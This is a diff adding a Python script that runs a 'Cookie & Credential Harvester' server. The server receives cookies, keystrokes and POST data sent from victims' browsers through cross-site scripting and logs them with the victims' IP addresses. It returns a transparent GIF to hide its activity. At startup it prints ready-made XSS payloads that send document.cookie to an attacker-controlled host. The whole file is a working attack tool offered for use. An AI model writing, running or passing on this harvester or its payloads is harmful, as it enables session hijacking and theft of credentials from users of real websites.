@@ -1,0 +1,72 @@
+#!/usr/bin/env python3
+"""
+Cookie & Credential Harvester Server
+Captures cookies sent via XSS payloads
+Usage: python3 cookie_harvester.py [port]
+"""
+from http.server import HTTPServer, BaseHTTPRequestHandler
+import urllib.parse, datetime, sys, os
+
+PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8888
+LOG_FILE = "harvested_data.txt"
+
+class HarvesterHandler(BaseHTTPRequestHandler):
+    def log_message(self, format, *args):
+        pass  # Suppress default logs
+
+    def do_GET(self):
+        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        parsed = urllib.parse.urlparse(self.path)
+        params = urllib.parse.parse_qs(parsed.query)
+        client_ip = self.client_address[0]
+
+        print(f"\n{'='*60}")
+        print(f"[{timestamp}] HIT from {client_ip}")
+        print(f"Path: {self.path}")
+
+        if 'c' in params or 'cookie' in params:
+            cookie_val = params.get('c', params.get('cookie', ['']))[0]
+            print(f"[+] COOKIE CAPTURED: {cookie_val}")
+            with open(LOG_FILE, 'a') as f:
+                f.write(f"[{timestamp}] IP:{client_ip} COOKIE:{cookie_val}\n")
+
+        if 'k' in params:
+            key = params.get('k', [''])[0]
+            print(f"[+] KEYPRESS: {key}")
+            with open(LOG_FILE, 'a') as f:
+                f.write(f"[{timestamp}] IP:{client_ip} KEY:{key}\n")
+
+        if 'data' in params:
+            data = params.get('data', [''])[0]
+            print(f"[+] DATA: {urllib.parse.unquote(data)}")
+
+        # Send 1x1 transparent pixel to avoid browser errors
+        self.send_response(200)
+        self.send_header('Content-Type', 'image/gif')
+        self.send_header('Access-Control-Allow-Origin', '*')
+        self.end_headers()
+        self.wfile.write(b'GIF89a\x01\x00\x01\x00\x00\xff\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x00;')
+
+    def do_POST(self):
+        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        client_ip = self.client_address[0]
+        length = int(self.headers.get('Content-Length', 0))
+        body = self.rfile.read(length).decode('utf-8', errors='ignore')
+        print(f"\n[{timestamp}] POST from {client_ip}")
+        print(f"[+] POST DATA: {body}")
+        with open(LOG_FILE, 'a') as f:
+            f.write(f"[{timestamp}] IP:{client_ip} POST:{body}\n")
+        self.send_response(200)
+        self.end_headers()
+
+print(f"[*] Cookie Harvester listening on 0.0.0.0:{PORT}")
+print(f"[*] Logging to: {LOG_FILE}")
+print(f"[*] XSS payloads to use:")
+print(f'    <img src="http://YOUR_IP:{PORT}/steal?c="+document.cookie>')
+print(f'    <script>new Image().src="http://YOUR_IP:{PORT}/steal?c="+document.cookie</script>')
+print(f"[*] Press Ctrl+C to stop\n")
+
+try:
+    HTTPServer(('0.0.0.0', PORT), HarvesterHandler).serve_forever()
+except KeyboardInterrupt:
+    print("\n[!] Harvester stopped")
